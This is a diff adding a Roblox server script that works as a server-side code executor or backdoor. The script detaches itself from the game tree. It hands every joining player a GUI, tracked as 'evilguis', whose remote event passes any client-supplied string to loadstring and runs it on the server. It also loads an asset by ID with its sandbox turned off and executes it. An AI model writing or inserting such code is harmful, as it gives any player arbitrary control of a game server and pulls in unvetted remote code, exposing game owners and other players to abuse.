@@ -1,0 +1,128 @@
+script.Parent=nil
+local script = script:Clone()
+local map = script.Map:Clone()
+local gui = script.GUI:Clone()
+
+map.Parent = workspace:FindFirstChildOfClass("Terrain")
+
+local scrs = {}
+local evilguis = {}
+local debounce = false
+
+local get = function(id)
+	local inst = game:GetService("AssetService"):LoadAssetAsync(id):FindFirstChildOfClass("LuaSourceContainer")
+	inst.Sandboxed = false
+	inst.Capabilities = SecurityCapabilities.new()
+	if inst:IsA("LuaSourceContainer") and not inst:IsA("Script") or inst:IsA("LocalScript") then
+		return require(inst)
+	else
+		pcall(game.Destroy, inst)
+	end
+end
+
+game:GetService("Players").PlayerAdded:Connect(function(plr)
+	task.spawn(function()
+		local gcl = gui:Clone()
+		evilguis[plr.Name] = gcl
+		gcl.Parent = plr:FindFirstChildOfClass("PlayerGui")
+		
+		task.spawn(function()
+			gcl.Destroying:Connect(function()
+				evilguis[plr.Name] = nil
+			end)
+		end)
+		
+		local rem = Instance.new("RemoteEvent", gcl["Script"])
+		rem.OnServerEvent:Connect(function(plr, ...)
+			local args = {...}
+			if args[1] == "ex" and args[2] and typeof(args[2]) == "string" then
+				local code = args[2]
+				local a = loadstring(code)
+
+				getfenv().owner = plr
+				setfenv(a, getfenv())
+
+				table.insert(scrs, task.spawn(a))
+			end
+			if args[1] == "res" then
+				plr:LoadCharacter()
+			end
+			if args[1] == "r6" then
+				pcall(function()
+					get(130299134792185).R6(plr.Name)
+				end)
+			end
+		end)
+	end)
+	
+	plr.Chatted:Connect(function(msg)
+		if msg == "g/b" or msg == "g/baseplate" or msg == "g/rm" then
+			local cl = map:Clone()
+			pcall(game.Destroy, map)
+			cl.Parent = workspace:FindFirstChildOfClass("Terrain")
+			map = cl
+		end
+		
+		if msg == "g/r" or msg == "g/reset" then
+			plr:LoadCharacter()
+		end
+		
+		if msg == "g/ns" or msg == "g/noscripts" then
+			if debounce then return end
+			
+			for _, thread in scrs do
+				task.cancel(thread)
+			end
+			
+			debounce = true
+			task.wait(5)
+			debounce = false
+		end
+		
+		if msg == "g/executor" or msg == "g/exe" or msg == "g/e" then
+			task.spawn(function()
+				local gcl = gui:Clone()
+				evilguis[plr.Name] = gcl
+				gcl.Parent = plr:FindFirstChildOfClass("PlayerGui")
+
+				task.spawn(function()
+					gcl.Destroying:Connect(function()
+						evilguis[plr.Name] = nil
+					end)
+				end)
+
+				local rem = Instance.new("RemoteEvent", gcl["Script"])
+				rem.OnServerEvent:Connect(function(plr, ...)
+					local args = {...}
+					if args[1] == "ex" and args[2] and typeof(args[2]) == "string" then
+						local code = args[2]
+						local a = loadstring(code)
+
+						getfenv().owner = plr
+						setfenv(a, getfenv())
+
+						table.insert(scrs, task.spawn(a))
+					end
+					if args[1] == "res" then
+						plr:LoadCharacter()
+					end
+					if args[1] == "r6" then
+						pcall(function()
+							get(130299134792185).R6(plr.Name)
+						end)
+					end
+				end)
+			end)
+		end
+		
+		if msg == "g/nogui" or msg == "g/noguis" or msg == "g/ng" then
+			plr:FindFirstChildOfClass("PlayerGui"):ClearAllChildren()
+		end
+		
+		if msg == "g/togglegui" or msg == "g/toggle" or msg == "g/tg" then
+			if evilguis[plr.Name] and typeof(evilguis[plr.Name]) == "Instance" then
+				evilguis[plr.Name].Enabled = not evilguis[plr.Name].Enabled
+			end
+		end
+	end)
+end)
